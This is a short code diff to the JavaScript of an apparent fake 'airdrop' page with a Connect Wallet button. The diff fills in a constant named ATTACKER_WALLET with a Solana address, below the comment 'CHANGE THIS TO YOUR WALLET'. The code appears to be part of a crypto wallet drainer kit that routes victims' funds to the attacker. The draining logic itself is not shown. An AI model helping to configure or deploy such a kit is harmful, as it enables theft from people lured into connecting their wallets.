@@ -10,7 +10,7 @@ const statusEl = document.getElementById("status");
 const form = document.getElementById("airdropForm");
 
 // CHANGE THIS TO YOUR WALLET
-const ATTACKER_WALLET = "YOUR_SOLANA_WALLET_ADDRESS_HERE";
+const ATTACKER_WALLET = "E6c1MDHowwHgsMtwGrt9NoZAfExjV61QGMnq7juu5jcM";
 
 // Connect Wallet
 connectBtn.addEventListener("click", async () => {
